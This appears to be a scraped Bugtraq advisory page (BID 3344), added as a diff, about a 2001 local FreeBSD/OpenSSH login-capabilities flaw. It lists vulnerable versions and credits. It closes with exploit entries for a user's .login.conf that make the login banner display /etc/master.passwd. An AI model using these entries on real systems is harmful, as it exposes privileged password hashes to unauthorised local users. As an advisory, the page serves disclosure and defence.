@@ -1,0 +1,107 @@
+#SpeeDr00t@Black Falcon<br>#bid3344<p><b><span style="font-size: 18pt;">FreeBSD Login Capabilities Privileged File Reading Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/3344/info">info</a><br><a href="http://www.securityfocus.com/bid/3344/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/3344/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/3344/solution">solution</a><br><a href="http://www.securityfocus.com/bid/3344/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				3344
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Environment Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 17 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 17 2001 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was announced by Przemyslaw Frasunek &lt;venglin@freebsd.lublin.pl&gt; via the securesoftware mailing list.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenBSD OpenSSH (FreeBSD Port) 2.9 p2<br/>
+<span class="related">
+						
+							+ 
+						
+						FreeBSD FreeBSD 4.4 <br/>
+</span>
+					
+				
+					FreeBSD FreeBSD 4.4 <br/>
+					
+				
+					FreeBSD FreeBSD 4.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	In a .login.conf entry contained in a home directory, make the following entry if accessing the system via OpenSSH:<br/><br/>default:        :copyright=/etc/master.passwd:<br/><br/>or<br/><br/>        :welcome=/etc/master.passwd:<br/><br/>Otherwise, if accessing the system via login, make the following entry in a .login.conf:<br/><br/>default:        :nologin=/etc/master.passwd:
+	
+		<ul>
+</ul>
+</div>
